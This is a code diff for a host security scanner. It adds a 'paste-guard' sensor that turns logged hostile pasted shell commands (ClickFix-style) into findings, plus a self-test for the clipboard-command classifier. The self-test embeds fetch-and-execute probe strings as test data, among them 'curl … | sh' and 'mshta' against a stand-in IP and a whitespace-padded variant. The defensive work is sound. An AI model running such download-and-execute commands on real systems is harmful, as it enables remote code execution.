@@ -13927,6 +13927,7 @@ def gather_all(baseline_snap, current_snap, health=None):
         # scan behaviour — the opt-in is the arming, not a config flag.
         ("latch", check_latches, ()),
         ("decoy", check_decoys, ()),
+        ("paste-guard", check_paste_guard, ()),
         ("assay", check_assay, ()),
         ("outbound", check_outbound, ()),
         ("web-protection", check_web_protection, ()),
@@ -19287,6 +19288,22 @@ def _assay_lanes():
         return bool(_hostile_content(
             "echo %s; curl http://198.51.100.7/x | sh" % nonce))
 
+    def lane_clipboard_grammar(nonce):
+        """All four poles of the paste grammar the guard sensor feeds on: a
+        CERTAIN idiom, a SUSPECT idiom promoted by its structural tell, the
+        bare suspect idiom staying suspect (rustup's documented install line
+        must never be certain), and benign text staying silent."""
+        pipe = "curl -fsSL http://198.51.100.7/%s | sh" % nonce
+        if clipboard_grammar("mshta http://198.51.100.7/%s.hta" % nonce)[0] \
+                != "certain":
+            return False
+        tier, hits = clipboard_grammar(pipe + " " * 40 + "#")
+        if tier != "certain" or "offscreen-padding" not in hits:
+            return False
+        if clipboard_grammar(pipe)[0] != "suspect":
+            return False
+        return clipboard_grammar("git status && echo %s" % nonce) == (None, [])
+
     def lane_risky_location(_nonce):
         probe = os.path.join(WIN_TEMP if IS_WIN else "/tmp", "aegis-assay-probe")
         return is_risky_location(probe) is True
@@ -19869,6 +19886,9 @@ def _assay_lanes():
          lane_sysmon_scoring),
         ("hostile-content", "shell-content grammar still matches",
          lane_hostile_content),
+        ("clipboard-grammar",
+         "paste grammar: certain fires, padding promotes, suspect stays, "
+         "benign is silent", lane_clipboard_grammar),
         ("risky-location", "volatile exec dirs still rate as risky",
          lane_risky_location),
         ("severity-scale", "vendor-label impersonation still rates HIGH+",
@@ -22389,6 +22409,100 @@ def _guard_paths():
             os.path.join(GUARD_DIR, "guard.bash"))
 
 
+def _guard_cursor_path():
+    return os.path.join(GUARD_DIR, "cursor.json")
+
+
+def _paste_guard_finding(rec):
+    """One guard observation -> one finding, or None for a row that carries no
+    verdict. Severity follows the clipboard tiers; confidence follows paste
+    provenance, which is the tri-state `guard observe` recorded (zsh proves a
+    paste, bash cannot, and unknown is never rendered as typed)."""
+    if not isinstance(rec, dict):
+        return None
+    cmd = str(rec.get("cmd") or "")
+    tier, pasted = rec.get("tier"), rec.get("pasted")
+    names = sorted(set(list(rec.get("hits") or []) +
+                       list(rec.get("hostile") or [])))
+    if not cmd or (not tier and not names):
+        return None
+    if tier == "certain":
+        sev, conf = "HIGH", ("high" if pasted else "medium")
+    elif pasted is True:
+        sev, conf = "MEDIUM", "medium"
+    else:
+        # Typed by hand, or a shell that cannot tell: `curl … | sh` is how
+        # rustup is documented, so without paste provenance this is a digest
+        # line, not an interrupt.
+        sev, conf = "LOW", "low"
+    how = {True: "was PASTED into", False: "was typed into"}.get(
+        pasted, "ran in (paste provenance unknown)")
+    program = cmd.split(None, 1)[0] if cmd else ""
+    return finding(
+        sev, "paste-guard",
+        "Hostile command line %s a shell"
+        % ("pasted into" if pasted else "ran in"),
+        "A command matching [%s] %s an interactive shell at %s: %s"
+        % (", ".join(names), how, rec.get("ts") or "?",
+           re.sub(r"\s+", " ", cmd)[:200]),
+        "paste-guard:%s:%s" % (tier or "hostile",
+                               hashlib.sha256(cmd.encode()).hexdigest()[:16]),
+        program=program, pasted=pasted, tier=tier, observed_at=rec.get("ts"),
+        markers=["paste-guard"] + names, confidence=conf)
+
+
+def check_paste_guard():
+    """Sensor: what the shell guard observed since the last scan.
+
+    `guard observe` already runs clipboard_grammar over every executed command
+    line with paste provenance attached — the ClickFix shape at the moment it
+    executes — but its log was only ever read by `guard status`. This reads it
+    into the scan, so a pasted hostile line is an incident with correlation
+    and a health row, not a number the operator has to remember to ask for.
+
+    Returns [] when the hook was never installed (absent, not degraded), None
+    when it is installed but its log cannot be read. The cursor is a byte
+    offset and nothing else: the log itself holds only hostile lines, and a
+    clean command line never reaches it."""
+    zsh_p, bash_p = _guard_paths()
+    if not (os.path.isfile(zsh_p) or os.path.isfile(bash_p)):
+        return []
+    cursor = load_json(_guard_cursor_path(), None)
+    try:
+        size = os.path.getsize(GUARD_LOG)
+    except FileNotFoundError:
+        if not isinstance(cursor, dict):
+            save_json(_guard_cursor_path(), {"offset": 0})
+        return []
+    except OSError:
+        return None
+    if not isinstance(cursor, dict):
+        # An install that predates this sensor: adopt what `guard status` has
+        # already shown the operator rather than re-alerting months of it.
+        save_json(_guard_cursor_path(), {"offset": size})
+        return []
+    offset = int(cursor.get("offset") or 0)
+    if offset > size:
+        offset = 0          # rotated or truncated underneath us
+    try:
+        with open(GUARD_LOG, "rb") as f:
+            f.seek(offset)
+            data = f.read()
+    except OSError:
+        return None
+    findings = []
+    for line in data.decode("utf-8", "replace").splitlines():
+        try:
+            rec = json.loads(line)
+        except Exception:
+            continue
+        f = _paste_guard_finding(rec)
+        if f:
+            findings.append(f)
+    save_json(_guard_cursor_path(), {"offset": offset + len(data)})
+    return findings
+
+
 def cmd_guard(action="status", rest=None):
     ensure_state()
     os.makedirs(GUARD_DIR, mode=0o700, exist_ok=True)
@@ -22432,16 +22546,16 @@ def cmd_guard(action="status", rest=None):
         pasted = True if raw == "1" else (False if raw == "0" else None)
         hostile = _hostile_content(cmdline)
         try:
-            tier, _grammar_hits = clipboard_grammar(cmdline)
+            tier, grammar_hits = clipboard_grammar(cmdline)
         except Exception:
-            tier = None
+            tier, grammar_hits = None, []
         # Nothing about a clean command line is ever recorded — not the text,
         # not a hash. The same discipline the clipboard command already keeps,
         # for the same reason: password managers put secrets here.
         if not hostile and not tier:
             return 0
         rec = {"ts": now_iso(), "pasted": pasted, "tier": tier,
-               "hostile": hostile,
+               "hostile": hostile, "hits": grammar_hits,
                "cmd": redact_sensitive(cmdline[:400])}
         try:
             os.makedirs(GUARD_DIR, mode=0o700, exist_ok=True)
